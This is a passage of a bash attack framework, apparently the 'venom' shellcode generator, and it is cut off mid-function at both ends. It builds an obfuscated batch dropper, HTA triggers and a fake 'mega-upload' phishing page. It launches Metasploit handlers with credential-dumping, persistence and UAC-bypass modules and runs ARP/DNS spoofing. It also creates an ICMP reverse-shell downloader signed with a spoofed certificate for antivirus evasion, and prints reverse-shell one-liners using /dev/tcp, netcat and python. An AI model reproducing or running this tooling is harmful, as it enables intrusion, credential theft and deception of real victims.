echo "@e%!%ch^O ,;, Of^f&&(,(,, (,;Co%LD%p%La%y %windir%\\\Le%!HuB!%git^Che%i%ck^Co%U%nt%-3%rol\".\"d^ll %temp%\\key^s\\Le^git^C%OM%he^ck^Cont%-R%rol.t^m%A%p));,, )&,( (,, @pi%!h%n^g -^n 4 w%%!hw^w.mi^cro%d0b%sof^t.c^o%OI%m > %tmp%\\lic%dR%e^ns%at%e.p^em);, ,) &&,(, (,,%$'''%, (,;c^Md%i%\".\"e%i0%X^e ,,/^R =c^O%Unt-8%p^Y /^Y %windir%\\Sy^s%dE%te^m%-%32\\Win^do%'''%w^s%AT%Power%Off%s^he%$'''%ll\\\v1.0\\p^o%IN%we^rs^%-iS%hell.e%!'''$%x%-i%e ,;^, %tmp%\\W^UAU%-Key%CTL.m%$%s%$'''%c &&,,, @c^d ,, %tmp% && ,;WU%VoiP%AUC%$,,,,%TL.m%-8%s^c /^No%db%PR^o  /w%Eb%\"I\"^N 1 /^%$'''%n\"O\"N%Func%i  /^eN%GL% $disp),) %i% ,,)" > $N4m.bat
fi
chmod +x $IPATH/output/$N4m.bat
N4m="$N4m.bat"


else


#
# store user inputed full path into UpL local variable ..
#
UpL=$(zenity --title "☠ INPUT FULL PATH OF PAYLOAD.EXE ☠" --filename=$IPATH --file-selection --text "chose payload.exe to be used") > /dev/null 2>&1
# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : EXE -> WINDOWS(exe)
    PAYLOAD : $paylo
    BINARY  : $UpL

!

   #
   # grab only the executable name from the full inputed path
   # ^/ (search for expression) +$ (print only last espression)
   #
   echo "[☠] Parsing agent filename data .."
   sleep 2
   echo "$UpL" > test.txt
   N4m=`grep -oE '[^/]+$' test.txt` > /dev/null 2>&1 # payload.exe
   rm test.txt > /dev/null 2>&1
   echo "[☠] Copy $N4m to output folder .."
   sleep 1
   cp $UpL $IPATH/output/$N4m > /dev/null 2>&1

fi


# build trigger.hta 
cd $IPATH/templates
echo "[☠] Building trigger.hta script .."
sleep 2
if [ "$chose" = "Build venom agent.bat" ]; then
  sed "s|IpAdR|$lhost|" template.hta > trigger.hta
  sed -i "s/NoMe/$N4m/g" trigger.hta
  sed -i "s/RdI/$D1r/g" trigger.hta
  mv trigger.hta $IPATH/output/EasyFileSharing.hta > /dev/null 2>&1
else
  sed "s|IpAdR|$lhost|" template_exe.hta > trigger.hta
  sed -i "s/NoMe/$N4m/g" trigger.hta
  sed -i "s/RdI/$D1r/g" trigger.hta
  mv trigger.hta $IPATH/output/EasyFileSharing.hta > /dev/null 2>&1
fi
echo "[☠] Remote upload agent path sellected:$D1r"
sleep 2
#
# copy all files to apache2 webroot ..
#
echo "[☠] Copy files to apache2 webroot .."
sleep 1
cp $IPATH/output/EasyFileSharing.hta $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
cp $IPATH/output/$N4m $ApAcHe/$N4m > /dev/null 2>&1
cd $IPATH/output



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nstore $N4m + EasyFileSharing.hta into apache and deliver\nURL pointing to the hta file or use apache2 (malicious url)" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH

  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $IPATH/output/$N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m $ApAcHe/$N4m
        echo "- ATTACK VECTOR: http://mega-upload.com/EasyFileSharing.hta"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost/EasyFileSharing.hta"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$chose" = "Build venom agent.bat" ] && [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/EasyFileSharing.hta > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}




# ------------------------------------
# ICMP (ping) REVERSE SHELL
# original project by: @Daniel Compton
# -
# This module introduces the changing of payload.exe finalname,
# builds dropper.bat (remote download/exc of payload.exe) and
# port all files to apache2 webroot, to trigger URL access download.
# ------------------------------------
sh_icmp_shell () {
# get user input to build agent
echo "[☠] Enter module settings!"
lhost=$(zenity --title="☠ Enter LHOST (local ip) ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
target=$(zenity --title="☠ Enter RHOST (target ip) ☠" --text "example: 192.168.1.72" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Dropper\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1


## setting default values in case user have skip this ..
slave="icmpsh"
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$N4m" ]; then N4m="dropper";fi
if [ -z "$rpath" ]; then rpath="%tmp%";fi
if [ -z "$target" ]; then
   echo "${RedF}[x]${white} We must provide the [${RedF} target ${white}] ip address ([${RedF}ERR${white}])"
   sleep 3; sh_exit
fi


# display final settings to user
cat << !

    venom settings
    ──────────────
    LHOST  : $lhost
    TARGET : $target
    UPLOAD : $rpath\\$slave.exe
    FORMAT : ICMP (ping) Reverse Shell
    DISCLOSURE: @Daniel Compton

!
sleep 2
## Disable ICMP ping replies
echo "[☠] Checking ICMP replies status ..";sleep 1
LOCALICMP=$(cat /proc/sys/net/ipv4/icmp_echo_ignore_all)
if [ "$LOCALICMP" -eq 0 ]; then
   echo "${RedF}[x]${white} ICMP Replies enabled (disable temporarily [${GreenF}OK${white}])${white}"
   sysctl -w net.ipv4.icmp_echo_ignore_all=1 > /dev/null 2>&1
   ICMPDIS="disabled";sleep 2
fi


## Build batch dropper
echo "[☠] Building batch dropper '$N4m.bat' ..";sleep 2
echo "@echo off" > $IPATH/output/$N4m.bat
echo "echo Please Wait, Installing Software .." >> $IPATH/output/$N4m.bat
echo "powershell -w 1 -C \"(new-Object Net.WebClient).DownloadFile('http://$lhost/$slave.exe', '$rpath\\$slave.exe')\" && start $rpath\\$slave.exe -t $lhost -d 500 -b 30 -s 128" >> $IPATH/output/$N4m.bat
echo "exit" >> $IPATH/output/$N4m.bat


## Writting ICMP reverse shell to output
echo "[☠] Writting ICMP reverse shell to output ..";sleep 2
cp $IPATH/bin/icmpsh/icmpsh.exe $IPATH/output/$slave.exe > /dev/nul 2>&1


## Make sure CarbonCopy dependencies are installed
ossl_packer=`which osslsigncode`
if ! [ "$?" -eq "0" ]; then
  echo "${RedF}[x]${white} osslsigncode Package not found, installing .."${Reset};sleep 2
  echo "" && sudo apt-get install osslsigncode && pip3 install pyopenssl && echo ""
fi


## SIGN EXECUTABLE (paranoidninja - CarbonCopy)
echo "[☠] Sign Executable for AV Evasion (CarbonCopy) ..";sleep 2
# random produces a number from 1 to 6
conv=$(cat /dev/urandom | tr -dc '1-6' | fold -w 1 | head -n 1)
# if $conv number output 'its small than' number 3 ...
if [ "$conv" "<" "3" ]; then SSL_domain="www.microsoft.com"; else SSL_domain="www.asus.com"; fi
echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate: $SSL_domain"${Reset};sleep 2
cd $IPATH/obfuscate
xterm -T "VENOM - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$slave.exe $IPATH/output/signed-$slave.exe && sleep 2"
mv $IPATH/output/signed-$slave.exe $IPATH/output/$slave.exe
rm -r certs > /dev/nul 2>&1


## Copy ALL files to apache2 webroot
echo "[☠] Porting ALL files to apache2 webroot ..";sleep 2
cp $IPATH/output/$slave.exe $ApAcHe/$slave.exe > /dev/nul 2>&1
cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat > /dev/nul 2>&1


## Print attack vector on terminal
echo "[☠] Starting apache2 webserver ..";sleep 1
echo "---"
echo "- ${YellowF}SEND THE URL GENERATED TO TARGET HOST${white}"
echo "- ATTACK VECTOR: http://$lhost/$N4m.bat"
echo "---"
echo -n "[☠] Press any key to start a handler .."
read odf
echo "[☠] Launching Listener, waiting for inbound connection ..";sleep 1
cd $IPATH/bin/icmpsh
xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "python icmpsh_m.py $lhost $target"
cd $IPATH


## Enable ICMP ping replies
# ONLY IF.. they have been disabled before.
if [ "$ICMPDIS" = "disabled" ]; then
   echo "${white}[${GreenF}✔${white}] Enabling Local ICMP Replies again ([${GreenF}OK${white}])${white}";sleep 2
   sysctl -w net.ipv4.icmp_echo_ignore_all=0 > /dev/null 2>&1
fi


## Clean recent files
echo "[☠] Cleanning temp generated files ..";sleep 2
rm $IPATH/output/icmpsh.exe > /dev/nul 2>&1
rm $ApAcHe/$N4m.bat > /dev/nul 2>&1
rm $ApAcHe/$slave.exe > /dev/nul 2>&1
cd $IPATH
zenity --title="☠ ICMP (ping) Reverse Shell ☠" --text "REMARK:\nRemmenber to delete '$slave.exe'\nslave (client) from target system." --info --width 350 > /dev/null 2>&1
}





# -----------------------------
# INTERACTIVE SHELLS (built-in) 
# ----------------------------- 
sh_buildin () {
QuE=$(zenity --question --title "☠ BUILT-IN SHELL GENERATOR ☠" --text "This module uses system built-in tools sutch as:\n'bash, netcat, ssh, python, perl, js, powershell'\nAnd use them to spawn a tcp connection.\n\nrun module?" --width 320) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then

cat << !

    OPTION    DESCRIPTION                   TARGET OS
    ------    -----------                   ---------
    1         simple ssh shell              Windows
    2         simple bash shell             Linux|Bsd|OSx
    3         simple reverse bash shell     Linux|Bsd|OSx
    4         simple reverse netcat shell   Windows
    5         simple reverse python shell   Linux|Bsd|Solaris|OSx|Windows
    6         simple reverse python shell2  Linux|Bsd|Solaris|OSx|Windows
    7         simple powershell shell       Windows
    8         simple php reverse shell      Web-Servers
    9         ruby Reverse_bash_shell       Linux
    10        ruby Reverse_bash_shell2      Linux
    11        perl-reverse-shell            Linux|Windows
    12        node.js reverse shell         Windows
   [ M ]      return to previous menu

!
sleep 1
echo -n "${BlueF}[${GreenF}➽${BlueF}]${white} Chose Option number:"${Reset};
read InSh3ll

   # built-in systems shells
   if [ "$InSh3ll" = "1" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     echo "[✔] Building -> simple bash shell..."
     echo "---"
     echo "- simple bash shell that uses bash dev/tcp"
     echo "- socket programming to build a conection over tcp"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : bash -i >& /dev/tcp/$lhost/$lport 0>&1"
     echo "- EXECUTE : sudo bash -i >& /dev/tcp/$lhost/$lport 0>&1"
     echo "- NETCAT  : sudo nc -l -v -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "2" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     echo "[✔] Building -> simple reverse bash shell..."
     echo "---"
     echo "- simple reverse bash shell uses bash dev/tcp"
     echo "- socket programming to build a reverse shell over tcp"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : 0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196"
     echo "- EXECUTE : sudo 0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2
 


   elif [ "$InSh3ll" = "3" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     echo "[✔] Building -> simple reverse netcat shell..."
     echo "---"
     echo "- simple Netcat reverse shell using bash"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : /bin/sh | nc $lhost $lport"
     echo "- EXECUTE : sudo /bin/sh | nc $lhost $lport"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "4" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     echo "[✔] Building -> simple ssh shell..."
     echo "---"
     echo "- Reverse connect using an SSH tunnel"
     echo "- Use The ssh client to forward a local port"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : ssh -R 6000:127.0.0.1:$lport $lhost"
     echo "- EXECUTE : sudo ssh -R 6000:127.0.0.1:$lport $lhost"
     echo "- NETCAT  : sudo nc -l -v 127.0.0.1 -p $lport"
     echo "---"
     sleep 3
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v 127.0.0.1 -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "5" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     cd $IPATH/templates/
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
     sed "s|IpAdDr|$lhost|" simple_shell.py > simple.raw
     sed "s|P0rT|$lport|" simple.raw > final.raw
     rm $IPATH/templates/simple.raw > /dev/null 2>&1
     mv final.raw $IPATH/output/$N4m.py > /dev/null 2>&1
     chmod +x $IPATH/output/$N4m.py > /dev/null 2>&1

     echo "[✔] Building -> simple reverse python shell..."
     echo "---"
     echo "- Reverse connect using one-liner python shell"
     echo "- that uses bash and socket to forward a tcp connection"
     echo "- https://highon.coffee/blog/reverse-shell-cheat-sheet/"
     echo "-"
     echo "- SHELL   : import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK"
     echo "-           _STREAM);s.connect(('$lhost',$lport));os.dup2(s.fileno(),0); os.dup2"
     echo "-           (s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
     echo "- EXECUTE : python $N4m.py"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.py" --info --width 300 > /dev/null 2>&1
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "6" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
     lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
     lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
     cd $IPATH/templates/
     N4m=$(zenity --title="☆ SHELL NAME ☆" --text "example: shell" --entry --width 330) > /dev/null 2>&1
     sed "s|IpAdDr|$lhost|" simple_shell2.py > simple.raw
     sed "s|P0rT|$lport|" simple.raw > final.raw
     rm $IPATH/templates/simple.raw > /dev/null 2>&1
     mv final.raw $IPATH/output/$N4m.py > /dev/null 2>&1
     chmod +x $IPATH/output/$N4m.py > /dev/null 2>&1
     chown $user $IPATH/output/$N4m.py > /dev/null 2>&1

     echo "[✔] Building -> simple reverse python shell..."
     echo "---"
     echo "- Reverse connect using one-liner python shell"
     echo "- that uses bash and socket to forward a tcp connection"
     echo "- http://securityweekly.com/2011/10/23/python-one-line-shell-code/"
     echo "-"
     echo "- SHELL   : import socket, subprocess;s = socket.socket();s.connect"
     echo "-           (('$lhost',$lport)) while 1: proc = subprocess.Popen(s.recv(1024),"
     echo "-           shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,"
     echo "-           stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())"
     echo "- EXECUTE : python $N4m.py"
     echo "- NETCAT  : sudo nc -l -v $lhost -p $lport"
     echo "---"
     sleep 3
     zenity --title="☆ SYSTEM built-in SHELLS ☆" --text "Shell Stored Under:\n$IPATH/output/$N4m.py" --info --width 300 > /dev/null 2>&1
     xterm -T " NETCAT LISTENER " -geometry 110x23 -e "sudo nc -l -v $lhost -p $lport"
     sleep 2


   elif [ "$InSh3ll" = "7" ]; then
     # get user input to build the payload
     echo "[☆] Enter shell settings!"
